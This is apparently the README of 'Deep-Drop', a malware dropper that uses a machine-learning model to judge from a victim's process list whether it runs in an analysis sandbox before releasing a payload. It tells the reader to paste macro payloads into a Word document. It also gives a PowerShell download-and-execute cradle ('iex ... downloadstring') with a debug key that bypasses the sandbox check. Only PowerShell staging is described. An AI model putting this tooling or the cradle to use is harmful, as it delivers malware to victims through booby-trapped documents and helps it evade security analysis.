# Deep-Drop
Machine learning enabled dropper

### Quick Start
```
pip install -r requirements.txt
python deepdrop.py
```

Copy paste the payload (core\macros) into a word doc and run.

### Quick start
```
λ pip3 install requirements
λ python3 deepdrop.py -d

 ____              ____
|    \ ___ ___ ___|    \ ___ ___ ___
|  |  | -_| -_| . |  |  |  _| . | . |
|____/|___|___|  _|____/|_| |___|  _|
              |_|               |_|


[-] All models loaded
[-] Routes loaded
[-] Payloads patched for localhost

[DBG] ece9d57d-ef30-47ed-accb-46ea3c436257

 * Serving Flask app "deepdrop" (lazy loading)
```

### Testing
Passing `-d\--debug` to deepdrop will give back a key that can be used to bypass the sandbox check for testing payloads. `powershell.exe -c "iex (new-object net.webclient).downloadstring('http://localhost/ece9d57d-ef30-47ed-accb-46ea3c436257')"`. Otherwise, submitting a process list and getting a decision from the model is the only way to get a payload executed.

### Staging 
Currently only powershell staging is implemented.

## Training
Implemented in Jupyter notebooks
